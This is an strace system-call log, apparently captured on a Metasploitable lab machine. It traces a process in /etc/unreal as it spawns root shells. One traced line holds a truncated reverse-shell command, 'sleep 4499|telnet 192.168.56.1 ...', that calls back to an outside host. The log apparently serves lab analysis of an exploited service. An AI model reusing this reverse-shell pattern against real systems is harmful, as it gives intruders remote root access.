+[pid  4967] 15:03:28.919284 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.919306 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4967] 15:03:28.919320 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4967] 15:03:28.919343 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  4967] 15:03:28.919463 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  4967] 15:03:28.919500 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4967] 15:03:28.919537 brk(0x8100000) = 0x8100000
+[pid  4967] 15:03:28.919552 getcwd("/etc/unreal", 4096) = 12
+[pid  4967] 15:03:28.919569 getpid()    = 4967
+[pid  4967] 15:03:28.919589 getppid()   = 4618
+[pid  4967] 15:03:28.919609 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4967] 15:03:28.919648 stat64("/sbin/sh", 0xbf886288) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.919664 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4967] 15:03:28.919700 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4967] 15:03:28.919751 socket(PF_FILE, SOCK_STREAM, 0) = 1
+[pid  4967] 15:03:28.919765 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  4967] 15:03:28.919781 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.919825 close(1)    = 0
+[pid  4967] 15:03:28.919840 socket(PF_FILE, SOCK_STREAM, 0) = 1
+[pid  4967] 15:03:28.919851 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  4967] 15:03:28.919865 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.919903 close(1)    = 0
+[pid  4967] 15:03:28.919920 open("/etc/nsswitch.conf", O_RDONLY) = 1
+[pid  4967] 15:03:28.919939 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+[pid  4967] 15:03:28.919973 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
+[pid  4967] 15:03:28.919985 read(1, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 475
+[pid  4967] 15:03:28.920012 read(1, "", 4096) = 0
+[pid  4967] 15:03:28.920023 close(1)    = 0
+[pid  4967] 15:03:28.920033 munmap(0xb7fd9000, 4096) = 0
+[pid  4967] 15:03:28.920054 open("/etc/ld.so.cache", O_RDONLY) = 1
+[pid  4967] 15:03:28.920070 fstat64(1, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4967] 15:03:28.920104 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd2000
+[pid  4967] 15:03:28.920115 close(1)    = 0
+[pid  4967] 15:03:28.920128 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.920150 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
+[pid  4967] 15:03:28.920174 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\000"..., 512) = 512
+[pid  4967] 15:03:28.920197 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+[pid  4967] 15:03:28.920232 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e44000
+[pid  4967] 15:03:28.920244 mmap2(0xb7e4b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e4b000
+[pid  4967] 15:03:28.920265 close(1)    = 0
+[pid  4967] 15:03:28.920279 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.920296 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
+[pid  4967] 15:03:28.920317 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\000"..., 512) = 512
+[pid  4967] 15:03:28.920340 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+[pid  4967] 15:03:28.920374 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e2c000
+[pid  4967] 15:03:28.920386 mmap2(0xb7e40000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e40000
+[pid  4967] 15:03:28.920404 mmap2(0xb7e42000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e42000
+[pid  4967] 15:03:28.920422 close(1)    = 0
+[pid  4967] 15:03:28.920454 munmap(0xb7fd2000, 29338) = 0
+[pid  4967] 15:03:28.920475 open("/etc/ld.so.cache", O_RDONLY) = 1
+[pid  4967] 15:03:28.920491 fstat64(1, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4967] 15:03:28.920525 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd2000
+[pid  4967] 15:03:28.920536 close(1)    = 0
+[pid  4967] 15:03:28.920549 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.920571 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
+[pid  4967] 15:03:28.920593 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0"..., 512) = 512
+[pid  4967] 15:03:28.920615 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+[pid  4967] 15:03:28.920650 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e22000
+[pid  4967] 15:03:28.920662 mmap2(0xb7e2a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e2a000
+[pid  4967] 15:03:28.920682 close(1)    = 0
+[pid  4967] 15:03:28.920697 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.920714 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
+[pid  4967] 15:03:28.920736 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30"..., 512) = 512
+[pid  4967] 15:03:28.920759 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+[pid  4967] 15:03:28.920793 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e17000
+[pid  4967] 15:03:28.920805 mmap2(0xb7e20000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e20000
+[pid  4967] 15:03:28.920825 close(1)    = 0
+[pid  4967] 15:03:28.920850 munmap(0xb7fd2000, 29338) = 0
+[pid  4967] 15:03:28.920869 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
+[pid  4967] 15:03:28.920886 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+[pid  4967] 15:03:28.920898 _llseek(1, 0, [0], SEEK_CUR) = 0
+[pid  4967] 15:03:28.920912 fstat64(1, {st_mode=S_IFREG|0644, st_size=1581, ...}) = 0
+[pid  4967] 15:03:28.920946 mmap2(NULL, 1581, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fd9000
+[pid  4967] 15:03:28.920958 _llseek(1, 1581, [1581], SEEK_SET) = 0
+[pid  4967] 15:03:28.920977 munmap(0xb7fd9000, 1581) = 0
+[pid  4967] 15:03:28.920989 close(1)    = 0
+[pid  4967] 15:03:28.921025 getpgrp()   = 3958
+[pid  4967] 15:03:28.921036 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.921059 getrlimit(RLIMIT_NPROC, {rlim_cur=36*1024, rlim_max=36*1024}) = 0
+[pid  4967] 15:03:28.921080 brk(0x8101000) = 0x8101000
+[pid  4967] 15:03:28.921113 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4967] 15:03:28.921129 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4967] 15:03:28.921149 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4967] 15:03:28.921216 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4967] 15:03:28.921253 stat64("/sbin/AB", 0xbf885f48) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.921274 stat64("/bin/AB", 0xbf885f48) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.921290 stat64("/usr/sbin/AB", 0xbf885f48) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.921309 stat64("/usr/bin/AB", 0xbf885f48) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.921330 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4967] 15:03:28.921348 clone(Process 4968 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e4d6f8) = 4968
+[pid  4968] 15:03:28.921414 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4968] 15:03:28.921435 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4968] 15:03:28.921455 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4968] 15:03:28.921475 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4968] 15:03:28.921504 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4968] 15:03:28.921529 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4968] 15:03:28.921549 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4968] 15:03:28.921656 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
+[pid  4968] 15:03:28.921676 --- SIGPIPE (Broken pipe) @ 0 (0) ---
+[pid  4968] 15:03:28.921779 exit_group(127) = ?
+Process 4968 detached
+[pid  4967] 15:03:28.929430 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4967] 15:03:28.929447 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4967] 15:03:28.929462 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 4968
+[pid  4967] 15:03:28.929479 waitpid(-1, 0xbf885bc8, WNOHANG) = -1 ECHILD (No child processes)
+[pid  4967] 15:03:28.929490 sigreturn() = ? (mask now [])
+[pid  4967] 15:03:28.929530 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4967] 15:03:28.929548 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4967] 15:03:28.929562 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+[pid  4967] 15:03:28.929578 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.929604 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4967] 15:03:28.929617 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
+[pid  4967] 15:03:28.929639 brk(0x8102000) = 0x8102000
+[pid  4967] 15:03:28.929662 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4967] 15:03:28.929698 stat64("/sbin/sh", 0xbf885f78) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.929714 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4967] 15:03:28.929750 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4967] 15:03:28.929793 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
+[pid  4967] 15:03:28.929810 clone(Process 4969 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e4d6f8) = 4969
+[pid  4969] 15:03:28.929873 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4969] 15:03:28.929894 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.929915 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.929934 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.929962 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.929987 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4969] 15:03:28.930007 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  4969] 15:03:28.930069 execve("/bin/sh", ["sh", "-c", "(sleep 4499|telnet 192.168.56.1 "...], [/* 14 vars */]) = 0
+[pid  4969] 15:03:28.930179 brk(0)      = 0x80f9000
+[pid  4969] 15:03:28.930209 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.930229 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2b000
+[pid  4969] 15:03:28.930248 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.930272 open("/etc/ld.so.cache", O_RDONLY) = 1
+[pid  4969] 15:03:28.930288 fstat64(1, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4969] 15:03:28.930322 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f23000
+[pid  4969] 15:03:28.930334 close(1)    = 0
+[pid  4969] 15:03:28.930347 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.930370 open("/lib/libncurses.so.5", O_RDONLY) = 1
+[pid  4969] 15:03:28.930387 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  4969] 15:03:28.930411 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  4969] 15:03:28.930446 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ef3000
+[pid  4969] 15:03:28.930460 mmap2(0xb7f20000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f20000
+[pid  4969] 15:03:28.939396 close(1)    = 0
+[pid  4969] 15:03:28.939415 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.939437 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
+[pid  4969] 15:03:28.939458 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  4969] 15:03:28.939481 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  4969] 15:03:28.939516 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eef000
+[pid  4969] 15:03:28.939529 mmap2(0xb7ef1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ef1000
+[pid  4969] 15:03:28.939550 close(1)    = 0
+[pid  4969] 15:03:28.939562 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.939580 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
+[pid  4969] 15:03:28.939599 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  4969] 15:03:28.939622 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  4969] 15:03:28.939656 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eee000
+[pid  4969] 15:03:28.939673 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d9f000
+[pid  4969] 15:03:28.939685 mmap2(0xb7ee8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ee8000
+[pid  4969] 15:03:28.939702 mmap2(0xb7eeb000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eeb000
+[pid  4969] 15:03:28.939718 close(1)    = 0
+[pid  4969] 15:03:28.939746 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d9e000
+[pid  4969] 15:03:28.939760 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d9e6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  4969] 15:03:28.939847 mprotect(0xb7ee8000, 4096, PROT_READ) = 0
+[pid  4969] 15:03:28.939894 munmap(0xb7f23000, 29338) = 0
+[pid  4969] 15:03:28.939933 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4969] 15:03:28.939951 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+[pid  4969] 15:03:28.939977 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf95cb90) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  4969] 15:03:28.940014 brk(0)      = 0x80f9000
+[pid  4969] 15:03:28.940025 brk(0x80fa000) = 0x80fa000
+[pid  4969] 15:03:28.940040 brk(0x80fb000) = 0x80fb000
+[pid  4969] 15:03:28.940063 getuid32()  = 0
+[pid  4969] 15:03:28.940074 getgid32()  = 0
+[pid  4969] 15:03:28.940083 geteuid32() = 0
+[pid  4969] 15:03:28.940093 getegid32() = 0
+[pid  4969] 15:03:28.940111 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4969] 15:03:28.940128 time(NULL)  = 1478462608
+[pid  4969] 15:03:28.940145 brk(0x80fc000) = 0x80fc000
+[pid  4969] 15:03:28.940163 brk(0x80fd000) = 0x80fd000
+[pid  4969] 15:03:28.940190 open("/proc/meminfo", O_RDONLY) = 1
+[pid  4969] 15:03:28.940220 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+[pid  4969] 15:03:28.940256 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2a000
+[pid  4969] 15:03:28.940269 read(1, "MemTotal:      4152252 kB\nMemFre"..., 1024) = 846
+[pid  4969] 15:03:28.940318 close(1)    = 0
+[pid  4969] 15:03:28.940330 munmap(0xb7f2a000, 4096) = 0
+[pid  4969] 15:03:28.940343 brk(0x80fe000) = 0x80fe000
+[pid  4969] 15:03:28.940374 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.940395 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.940415 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.940435 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.940454 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+[pid  4969] 15:03:28.940474 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  4969] 15:03:28.940496 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4969] 15:03:28.940510 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  4969] 15:03:28.940532 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  4969] 15:03:28.940650 stat64("/etc/unreal", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4969] 15:03:28.940688 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4969] 15:03:28.940723 getpid()    = 4969
+[pid  4969] 15:03:28.940742 getppid()   = 4967
+[pid  4969] 15:03:28.940761 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
+[pid  4969] 15:03:28.940799 stat64("/sbin/sh", 0xbf95cb68) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.940814 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4969] 15:03:28.940851 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  4969] 15:03:28.940900 socket(PF_FILE, SOCK_STREAM, 0) = 1
+[pid  4969] 15:03:28.940915 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  4969] 15:03:28.940930 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.940973 close(1)    = 0
+[pid  4969] 15:03:28.940987 socket(PF_FILE, SOCK_STREAM, 0) = 1
+[pid  4969] 15:03:28.940998 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  4969] 15:03:28.941012 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.941049 close(1)    = 0
+[pid  4969] 15:03:28.941066 open("/etc/nsswitch.conf", O_RDONLY) = 1
+[pid  4969] 15:03:28.941085 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+[pid  4969] 15:03:28.941118 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2a000
+[pid  4969] 15:03:28.941130 read(1, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 475
+[pid  4969] 15:03:28.941156 read(1, "", 4096) = 0
+[pid  4969] 15:03:28.941167 close(1)    = 0
+[pid  4969] 15:03:28.941177 munmap(0xb7f2a000, 4096) = 0
+[pid  4969] 15:03:28.941197 open("/etc/ld.so.cache", O_RDONLY) = 1
+[pid  4969] 15:03:28.941213 fstat64(1, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4969] 15:03:28.941246 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f23000
+[pid  4969] 15:03:28.941258 close(1)    = 0
+[pid  4969] 15:03:28.941271 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.941292 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
+[pid  4969] 15:03:28.941315 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\000"..., 512) = 512
+[pid  4969] 15:03:28.941339 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+[pid  4969] 15:03:28.941373 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d95000
+[pid  4969] 15:03:28.941385 mmap2(0xb7d9c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d9c000
+[pid  4969] 15:03:28.941406 close(1)    = 0
+[pid  4969] 15:03:28.941419 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.941436 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
+[pid  4969] 15:03:28.941457 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\000"..., 512) = 512
+[pid  4969] 15:03:28.941479 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+[pid  4969] 15:03:28.941513 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d7d000
+[pid  4969] 15:03:28.941524 mmap2(0xb7d91000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d91000
+[pid  4969] 15:03:28.941542 mmap2(0xb7d93000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d93000
+[pid  4969] 15:03:28.941559 close(1)    = 0
+[pid  4969] 15:03:28.941591 munmap(0xb7f23000, 29338) = 0
+[pid  4969] 15:03:28.941615 open("/etc/ld.so.cache", O_RDONLY) = 1
+[pid  4969] 15:03:28.941632 fstat64(1, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4969] 15:03:28.941665 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f23000
+[pid  4969] 15:03:28.941676 close(1)    = 0
+[pid  4969] 15:03:28.941689 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.941710 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
+[pid  4969] 15:03:28.941732 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0"..., 512) = 512
+[pid  4969] 15:03:28.941754 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+[pid  4969] 15:03:28.941787 brk(0x80ff000) = 0x80ff000
+[pid  4969] 15:03:28.941801 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d73000
+[pid  4969] 15:03:28.941813 mmap2(0xb7d7b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d7b000
+[pid  4969] 15:03:28.941833 close(1)    = 0
+[pid  4969] 15:03:28.941847 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4969] 15:03:28.941865 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
+[pid  4969] 15:03:28.941886 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30"..., 512) = 512
+[pid  4969] 15:03:28.941909 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+[pid  4969] 15:03:28.941942 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d68000
+[pid  4969] 15:03:28.941954 mmap2(0xb7d71000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d71000
+[pid  4969] 15:03:28.941975 close(1)    = 0
+[pid  4969] 15:03:28.941999 munmap(0xb7f23000, 29338) = 0
+[pid  4969] 15:03:28.942017 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
+[pid  4969] 15:03:28.942034 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+[pid  4969] 15:03:28.942046 _llseek(1, 0, [0], SEEK_CUR) = 0
+[pid  4969] 15:03:28.942060 fstat64(1, {st_mode=S_IFREG|0644, st_size=1581, ...}) = 0
+[pid  4969] 15:03:28.942093 mmap2(NULL, 1581, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f2a000
+[pid  4969] 15:03:28.942105 _llseek(1, 1581, [1581], SEEK_SET) = 0
+[pid  4969] 15:03:28.942124 munmap(0xb7f2a000, 1581) = 0
+[pid  4969] 15:03:28.942135 close(1)    = 0
+[pid  4969] 15:03:28.942164 brk(0x8100000) = 0x8100000
+[pid  4969] 15:03:28.942184 getpgrp()   = 3958
+[pid  4969] 15:03:28.942195 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
